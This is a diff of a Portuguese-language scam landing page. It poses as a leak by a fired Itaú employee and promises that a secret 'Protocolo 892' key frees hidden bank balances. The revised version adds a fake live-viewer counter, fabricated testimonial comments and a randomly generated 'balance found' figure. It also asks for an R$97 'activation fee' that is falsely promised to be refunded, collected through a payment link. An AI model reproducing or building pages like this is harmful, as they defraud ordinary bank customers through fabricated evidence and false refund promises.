@@ -3,136 +3,101 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Protocolo de Reembolso Bancário - Ativo</title>
-    
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <title>Portal G1 - Protocolo 892 Ativo</title>
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;700;900&display=swap" rel="stylesheet">
-
-    <script>
-    !function(f,b,e,v,n,t,s)
-    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
-    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
-    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
-    n.queue=[];t=b.createElement(e);t.async=!0;
-    t.src=v;s=b.getElementsByTagName(e)[0];
-    s.parentNode.insertBefore(t,s)}(window, document,'script',
-    'https://connect.facebook.net/en_US/fbevents.js');
-    fbq('init', '1773918999950681'); 
-    fbq('track', 'PageView');
-    </script>
 
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Roboto', sans-serif; }
-        body { background-color: #f0f2f5; color: #1c1e21; line-height: 1.6; }
+        body { background-color: #f0f2f5; color: #1c1e21; }
         
-        .alert-bar { background-color: #c00; color: #fff; text-align: center; padding: 10px; font-weight: bold; font-size: 0.9rem; animation: pulse 2s infinite; }
-        @keyframes pulse { 0% { background-color: #c00; } 50% { background-color: #e00; } 100% { background-color: #c00; } }
-
+        .alert-bar { background-color: #c00; color: #fff; text-align: center; padding: 12px; font-weight: bold; font-size: 0.9rem; position: sticky; top: 0; z-index: 999; }
         .container { max-width: 600px; margin: 0 auto; background: #fff; padding: 20px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
-        h1 { font-size: 26px; color: #111; line-height: 1.2; margin-bottom: 15px; text-align: center; font-weight: 900; }
+        
+        h1 { font-size: 28px; color: #111; line-height: 1.2; margin-bottom: 15px; text-align: left; font-weight: 900; }
         .highlight { color: #c00; background: yellow; padding: 0 5px; }
 
-        .author-box { display: flex; align-items: center; margin-bottom: 20px; border-bottom: 1px solid #ddd; padding-bottom: 10px; }
-        .author-img { width: 50px; height: 50px; border-radius: 50%; background: #ddd; margin-right: 10px; overflow: hidden; }
+        .author-box { display: flex; align-items: center; margin: 20px 0; border-bottom: 1px solid #ddd; padding-bottom: 15px; }
+        .author-img { width: 50px; height: 50px; border-radius: 50%; margin-right: 12px; overflow: hidden; background: #eee; }
         .author-img img { width: 100%; height: 100%; object-fit: cover; }
         .date { font-size: 12px; color: #666; }
 
-        p { margin-bottom: 15px; font-size: 18px; color: #333; }
+        .viewing-now { background: #eef3ff; color: #1877f2; padding: 8px; border-radius: 5px; font-size: 13px; display: inline-block; margin-bottom: 15px; font-weight: bold; }
+
+        p { margin-bottom: 18px; font-size: 18px; color: #333; line-height: 1.5; }
         .print-screen { width: 100%; border: 2px solid #000; margin: 15px 0; border-radius: 8px; }
 
-        .cta-box { background-color: #fff9c4; border: 2px dashed #fbc02d; padding: 20px; text-align: center; margin: 30px 0; border-radius: 10px; }
-        .btn-pulse { background: #28a745; color: white; font-size: 22px; font-weight: bold; padding: 20px 15px; text-decoration: none; display: block; border-radius: 8px; box-shadow: 0 4px 0 #1e7e34; animation: grow 1.5s infinite alternate; text-transform: uppercase; cursor: pointer; border: none; width: 100%; }
-        @keyframes grow { from { transform: scale(1); } to { transform: scale(1.02); } }
+        .cta-box { background-color: #fff9c4; border: 2px dashed #fbc02d; padding: 25px; text-align: center; margin: 30px 0; border-radius: 10px; }
+        .btn-pulse { background: #28a745; color: white; font-size: 22px; font-weight: bold; padding: 20px; text-decoration: none; display: block; border-radius: 8px; animation: grow 1.5s infinite alternate; text-transform: uppercase; border: none; cursor: pointer; }
+        @keyframes grow { from { transform: scale(1); } to { transform: scale(1.05); } }
 
-        /* QUIZZ CLARO (ESTILO GOV/BANCÁRIO) */
-        #quizz-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 10000; justify-content: center; align-items: center; padding: 20px; }
-        .quizz-content { background: #ffffff; border-radius: 15px; padding: 25px; max-width: 500px; width: 100%; text-align: center; color: #333; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        /* QUIZZ CLARO */
+        #quizz-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); z-index: 10000; justify-content: center; align-items: center; padding: 20px; }
+        .quizz-content { background: #fff; border-radius: 12px; padding: 25px; max-width: 450px; width: 100%; text-align: center; color: #333; }
         .quizz-step { display: none; }
         .quizz-step.active { display: block; }
-        .q-btn { display: block; width: 100%; background: #f8f9fa; color: #333; border: 2px solid #ddd; padding: 18px; margin: 12px 0; border-radius: 10px; font-weight: bold; cursor: pointer; text-align: left; font-size: 17px; }
-        .q-btn:hover { border-color: #28a745; background: #e8f5e9; }
+        .q-btn { display: block; width: 100%; background: #f0f2f5; color: #333; border: 1px solid #ddd; padding: 15px; margin: 10px 0; border-radius: 8px; font-weight: bold; cursor: pointer; text-align: left; }
         
-        .loading-bar { width: 100%; background: #eee; height: 20px; border-radius: 10px; overflow: hidden; margin: 20px 0; border: 1px solid #ddd; }
-        .progress { width: 0%; height: 100%; background: #28a745; transition: width 0.1s; }
-        
-        .blur-code { background: #f0f0f0; color: #1b5e20; font-size: 28px; font-weight: bold; padding: 15px; border: 2px dashed #28a745; letter-spacing: 4px; filter: blur(6px); margin: 20px 0; }
-        .valor-sorteado { font-size: 35px; font-weight: 900; color: #28a745; margin: 15px 0; }
+        .blur-code { background: #eee; padding: 15px; font-size: 24px; font-weight: bold; filter: blur(6px); border: 2px dashed #28a745; margin: 15px 0; }
 
-        /* COMENTÁRIOS */
         .comments-section { margin-top: 40px; border-top: 1px solid #ccc; padding-top: 20px; }
         .comment { display: flex; margin-bottom: 15px; }
         .avatar { width: 40px; height: 40px; border-radius: 50%; margin-right: 10px; }
-        .comment-body { background: #f0f2f5; padding: 10px; border-radius: 18px; width: 100%; }
-        .name { font-weight: bold; font-size: 14px; color: #000; }
-        .text { font-size: 14px; margin-top: 2px; }
+        .comment-body { background: #f0f2f5; padding: 12px; border-radius: 18px; width: 100%; }
         .meta { font-size: 12px; color: #65676b; margin-top: 5px; font-weight: bold; }
-
-        #notification { position: fixed; bottom: 20px; left: 20px; background: #fff; padding: 12px; border-radius: 50px; box-shadow: 0 5px 15px rgba(0,0,0,0.2); display: none; align-items: center; z-index: 1000; width: 280px; border: 1px solid #e0e0e0; }
-        #notification img { width: 40px; height: 40px; border-radius: 50%; margin-right: 10px; }
-        #notification p { font-size: 12px; margin: 0; line-height: 1.2; }
     </style>
 </head>
 <body>
 
-    <div class="alert-bar">⚠️ URGENTE: ESTA PÁGINA SERÁ RETIRADA DO AR EM BREVE POR ORDEM JUDICIAL.</div>
+    <div class="alert-bar">⚠️ ATENÇÃO: ESTE SITE PODE SAIR DO AR A QUALQUER MOMENTO</div>
 
     <div class="container">
-        
+        <div class="viewing-now">👁️ 179 pessoas estão lendo isso agora</div>
+
         <h1>Ex-Funcionário do Itaú VAZA Brecha de Segurança: <span class="highlight">"CPFs com saldo retido podem sacar até R$ 2.940,00 extra hoje"</span></h1>
 
         <div class="author-box">
-            <div class="author-img">
-                <img src="https://github.com/portal-verificador-br/robertomenezes/blob/main/robertoitau.png?raw=true" alt="Roberto">
-            </div>
+            <div class="author-img"><img src="https://github.com/portal-verificador-br/robertomenezes/blob/main/robertoitau.png?raw=true"></div>
             <div>
                 <strong>Por: Roberto M.</strong><br>
-                <span class="date">Atualizado: Hoje, às 05:27</span>
+                <span class="date">Publicado: Hoje, às 05:27</span>
             </div>
         </div>
 
-        <p>Eles acharam que podiam me calar.</p>
-        <p>Fui demitido semana passada apenas porque tentei avisar um cliente que ele tinha <strong>dinheiro esquecido</strong> na conta.</p>
-        <p>Não é sorteio, é direito seu. Eu criei um <strong>Guia Passo a Passo</strong> simples: é só abrir, ler e seguir o que eu mostro. Você vai selecionar o seu banco, copiar o código que eu te dou e colar dentro do seu aplicativo para liberar o saque.</p>
+        <p>Eles acharam que podiam me calar, mas não vou permitir que continuem roubando vocês.</p>
+        <p>Trabalhei 20 anos no T.I. bancário. Fui demitido por avisar uma senhora idosa que ela tinha <strong>dinheiro esquecido</strong>. O banco usa esse saldo pra lucrar enquanto você passa aperto.</p>
         
-        <p>Veja abaixo o print da conta do meu irmão. Ele nunca acreditou em nada disso, mas ontem seguiu o guia, ativou a chave e o banco liberou o saldo dele na hora:</p>
+        <p>Vazei o <strong>Cód. 892</strong>. É um Guia prático: você lê, seleciona seu banco, copia a chave e cola no seu app. O valor é liberado na hora.</p>
         
-        <img src="inter.png" class="print-screen" alt="Prova de Saldo">
+        <p>Veja a conta do meu irmão após ativar a chave ontem. O saldo caiu em 10 minutos:</p>
+        <img src="inter.png" class="print-screen">
 
-        <div class="cta-box">
-            <h2>CONSULTAR SALDO DISPONÍVEL</h2>
-            <p>Clique no botão abaixo para verificar se o seu CPF possui saldo acumulado para resgate imediato via Protocolo 892.</p>
+        <div class="cta-box" style="background-color: #e8f5e9; border-color: #28a745;">
+            <h2 style="color: #1b5e20;">ATIVAÇÃO REEMBOLSÁVEL</h2>
+            <p style="font-size: 16px;">O custo de ativação da chave no servidor caiu de <span style="text-decoration: line-through;">R$ 997,00</span> para <b>apenas R$ 97,00</b> hoje.</p>
+            <p style="font-size: 16px; font-weight: bold; color: #28a745;">⚠️ IMPORTANTE: Esse valor de R$ 97 é apenas para validar seu CPF no servidor. Assim que a chave for ativada, esse valor é ESTORNADO e volta para sua conta junto com o seu saldo principal.</p>
             <br>
-            <button onclick="openQuizz()" class="btn-pulse">
-                🔓 CONSULTAR MEU SALDO AGORA
-            </button>
-            <p style="font-size: 12px; color: #666; margin-top: 10px;">Verificação segura via Servidor Nacional.</p>
+            <button onclick="openQuizz()" class="btn-pulse">🔓 CONSULTAR E ATIVAR CHAVE</button>
+            <p style="font-size: 14px; color: #333; margin-top: 15px;">Após a ativação, meu WhatsApp pessoal aparecerá para você.</p>
         </div>
 
         <div class="comments-section">
-            <p style="font-weight: bold; margin-bottom: 15px;">203 Comentários</p>
+            <p style="font-weight: bold; margin-bottom: 20px;">203 Comentários</p>
+            
             <div class="comment">
                 <img src="https://randomuser.me/api/portraits/men/1.jpg" class="avatar">
                 <div class="comment-body">
                     <div class="name">Fernando Henrique Souza</div>
-                    <div class="text">Cara, eu tô tremendo... fiz no app do Nubank e apareceu R$ 990,00 que eu nem sabia que tinha. Valeu Roberto!</div>
+                    <div class="text">Gente, os 97 reais voltaram mesmo! Ativei a chave e caiu o saldo de 1.200 + os 97 da ativação. Valeu Roberto!</div>
                     <div class="meta">Curtir · Responder · 2 min</div>
                 </div>
             </div>
+
             <div class="comment">
-                <img src="https://randomuser.me/api/portraits/women/2.jpg" class="avatar">
+                <img src="https://randomuser.me/api/portraits/women/5.jpg" class="avatar">
                 <div class="comment-body">
-                    <div class="name">Carla Dias</div>
-                    <div class="text">Gente, é verdade mesmo? Tô com medo de ser golpe.</div>
-                    <div class="meta">Curtir · Responder · 5 min</div>
-                </div>
-            </div>
-            <div class="comment" style="margin-left: 50px;">
-                <img src="https://randomuser.me/api/portraits/men/3.jpg" class="avatar">
-                <div class="comment-body">
-                    <div class="name">Marcos Pimentel de Oliveira</div>
-                    <div class="text">Carla, pode ir sem medo. Ativei a chave aqui seguindo o guia dele e caiu tudo certinho.</div>
-                    <div class="meta">Curtir · Responder · 3 min</div>
+                    <div class="name">Juliana Martins</div>
+                    <div class="text">Roberto, obrigada! Ele me ajudou no zap, a taxa de ativação é só pro sistema reconhecer o CPF mesmo, depois volta tudo.</div>
+                    <div class="meta">Curtir · Responder · 45 min</div>
                 </div>
             </div>
             </div>
@@ -140,100 +105,54 @@
 
     <div id="quizz-overlay">
         <div class="quizz-content">
-            
-            <div class="quizz-step active" id="step0">
-                <h2 style="color: #c00;">CONSULTANDO CPF...</h2>
-                <div class="loading-bar"><div class="progress" id="bar0"></div></div>
-                <p id="msg-consulta">Conectando ao banco de dados...</p>
-            </div>
-
-            <div class="quizz-step" id="step1">
-                <h2 style="color: #333;">SALDO LOCALIZADO!</h2>
-                <p>O sistema identificou um valor disponível para o seu CPF:</p>
-                <div class="valor-sorteado" id="valor-final">R$ 0,00</div>
-                <p style="font-size: 14px; color: #666;">Para prosseguir com o resgate deste valor, você precisa da Chave de Acesso Oficial.</p>
-                <button class="q-btn" onclick="nextStep(2)" style="text-align: center; background: #28a745; color: #fff; border: none;">PROSSEGUIR PARA GERAR CHAVE</button>
+            <div class="quizz-step active" id="step1">
+                <h2>PASSO 1/2</h2>
+                <p>Selecione o banco onde você deseja ativar o Protocolo 892:</p>
+                <button class="q-btn" onclick="checkBank('Itaú')">🏦 Banco Itaú</button>
+                <button class="q-btn" onclick="checkBank('Caixa')">🏦 Caixa Econômica</button>
+                <button class="q-btn" onclick="checkBank('Nubank')">📱 Nubank / Digitais</button>
+                <button class="q-btn" onclick="checkBank('Outro')">🔑 Outros Bancos</button>
             </div>
 
             <div class="quizz-step" id="step2">
-                <h2 style="color: #333;">SEGURANÇA GOV</h2>
-                <p style="font-size: 15px; margin: 15px 0;">A Chave de Acesso é gerada pelo <strong>Servidor Federal de Protocolos</strong>. Você está ciente que deve preencher seus dados corretamente na próxima página para o Pix ser enviado?</p>
-                <button class="q-btn" onclick="startFinalLoading()">✅ SIM, ESTOU CIENTE</button>
-            </div>
-
-            <div class="quizz-step" id="stepLoading">
-                <h2>GERANDO CHAVE...</h2>
-                <div class="loading-bar"><div class="progress" id="bar1"></div></div>
-                <p style="font-size: 12px; color: #888;">Vinculando valor ao seu CPF via Protocolo 892...</p>
+                <h2 style="color: #28a745;">SALDO IDENTIFICADO!</h2>
+                <p>Localizamos o seguinte valor para clientes do <strong id="banco-nome"></strong>:</p>
+                <p style="font-size: 32px; font-weight: 900; color: #28a745; margin: 15px 0;" id="valor-sorte">R$ 1.842,00</p>
+                <div style="background: #fdf2f2; padding: 10px; border-radius: 5px; font-size: 13px; color: #c00;">
+                    Para resgatar, você precisa validar seu CPF no servidor nacional agora.
+                </div>
+                <button class="q-btn" onclick="generateKey()" style="background: #28a745; color: #fff; text-align: center; border: none; margin-top: 15px;">GERAR CHAVE DE ATIVAÇÃO</button>
             </div>
 
             <div class="quizz-step" id="stepFinal">
-                <h2 style="color: #28a745;">CHAVE GERADA!</h2>
-                <p style="font-size: 14px; margin-top: 10px;">Sua chave individual de ativação:</p>
-                
+                <h2 style="color: #28a745;">CHAVE RESERVADA!</h2>
                 <div class="blur-code">S12382-BR</div>
-
-                <div style="background: #fff3cd; padding: 15px; border-radius: 10px; text-align: left; border: 1px solid #ffeeba; margin-bottom: 20px;">
-                    <p style="font-size: 13px; color: #856404; line-height: 1.4;">
-                        <strong>⚠️ AVISO:</strong> Para liberar o código oculto e o guia de resgate, você deve <strong>finalizar a ativação</strong> na página seguinte. Seus dados e a chave serão enviados para o seu e-mail em 2 minutos.
-                    </p>
+                <div style="text-align: left; font-size: 13px; line-height: 1.4;">
+                    <p><strong>⚠️ COMO CONCLUIR:</strong></p>
+                    <p>1. Clique no botão abaixo para ir ao formulário de ativação.</p>
+                    <p>2. Preencha seus dados para vincular a chave ao seu CPF.</p>
+                    <p>3. Pague a taxa de ativação de <strong>R$ 97,00</strong> (Este valor será estornado e voltará para você em 2 minutos junto com seu saldo).</p>
                 </div>
-
-                <a href="https://go.perfectpay.com.br/PPU38CQ79SG" class="btn-pulse" style="animation: none;">
-                    FINALIZAR E ATIVAR AGORA ➤
-                </a>
+                <a href="https://go.perfectpay.com.br/PPU38CQ79SG" class="btn-pulse" style="font-size: 18px; margin-top: 20px;">ATIVAR E RECEBER ESTORNO ➤</a>
             </div>
-
         </div>
     </div>
 
     <script>
-        function openQuizz() { 
-            document.getElementById('quizz-overlay').style.display = 'flex';
-            startInitialLoading();
+        function openQuizz() { document.getElementById('quizz-overlay').style.display = 'flex'; }
+        
+        function checkBank(nome) {
+            document.getElementById('banco-nome').innerText = nome;
+            const valor = (Math.random() * (2940 - 870) + 870).toLocaleString('pt-br', {style: 'currency', currency: 'BRL'});
+            document.getElementById('valor-sorte').innerText = valor;
+            nextStep(2);
         }
+
+        function generateKey() { nextStep('Final'); }
 
         function nextStep(step) {
             document.querySelectorAll('.quizz-step').forEach(s => s.classList.remove('active'));
             document.getElementById('step' + step).classList.add('active');
-        }
-
-        function startInitialLoading() {
-            let width = 0;
-            let bar = document.getElementById('bar0');
-            let msg = document.getElementById('msg-consulta');
-            let interval = setInterval(() => {
-                if (width >= 100) {
-                    clearInterval(interval);
-                    generateRandomValue();
-                    nextStep(1);
-                } else {
-                    width += 2;
-                    bar.style.width = width + '%';
-                    if(width == 40) msg.innerText = "Buscando registros na Receita...";
-                    if(width == 80) msg.innerText = "Localizando saldos retidos...";
-                }
-            }, 50);
-        }
-
-        function generateRandomValue() {
-            const valor = (Math.random() * (2940 - 800) + 800).toLocaleString('pt-br', {style: 'currency', currency: 'BRL'});
-            document.getElementById('valor-final').innerText = valor;
-        }
-
-        function startFinalLoading() {
-            nextStep('Loading');
-            let width = 0;
-            let bar = document.getElementById('bar1');
-            let interval = setInterval(() => {
-                if (width >= 100) {
-                    clearInterval(interval);
-                    nextStep('Final');
-                } else {
-                    width += 3;
-                    bar.style.width = width + '%';
-                }
-            }, 60);
         }
     </script>
 </body>
